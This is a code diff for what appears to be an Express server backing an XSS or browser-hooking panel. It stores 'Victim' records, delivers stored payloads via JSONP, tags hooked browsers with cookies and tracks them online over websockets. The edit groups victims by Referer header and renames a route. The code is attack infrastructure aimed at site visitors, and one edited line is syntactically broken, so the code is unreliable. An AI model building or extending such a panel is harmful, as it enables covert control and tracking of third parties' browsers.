@@ -19,10 +19,11 @@ router.all('/i/', function(req, res){
         if(info)return res.jsonp(info.load);
         sql.Item.findById(id, function(err, info){
             if(!info)return res.jsonp({err:404});
-            who = sql.hash(info.owner+id+Date.now());
+            var group = info.group||req.header('referer')||'Default';
+            who = sql.hash(group+id+Math.random());
             res.cookie('who', who);
             sql.Victim.create({
-                owner:info.owner,
+                group:group,
                 who:who,
                 name:info.name+'_'+Date.now(),
                 payload:info.payload,
@@ -67,11 +68,11 @@ var http = function(req, res){
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
         if(!info||(!who&&!req.session.user))return err404(req, res);
-        !(req.session.user&&(req.session.user.name == info.owner))&&online(who, Date.now());
+        !req.session.user&&online(who, Date.now());
         handle(req, res, info.modules, null, sql.Victim, who, null);
     });
 };
-router.all('/h/:uri', http);
+router.all('/e/:uri', http);
 router.all('/home/page/:uri', http);
 
 exports.ws = function(ws, req){
@@ -79,8 +80,8 @@ exports.ws = function(ws, req){
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
         if(!info||(!who&&!req.session.user))return null;
-        var owner = req.session.user&&(req.session.user.name == info.owner);
-        who = (req.session.user&&(req.session.user.name == info.owner))?null:who;
+        var owner = req.session.user:true?false;
+        who = req.session.user?null:who;
         ws.on('open', function(){
             auws[who] = ws;
             return !owner&&online(who, 'online');
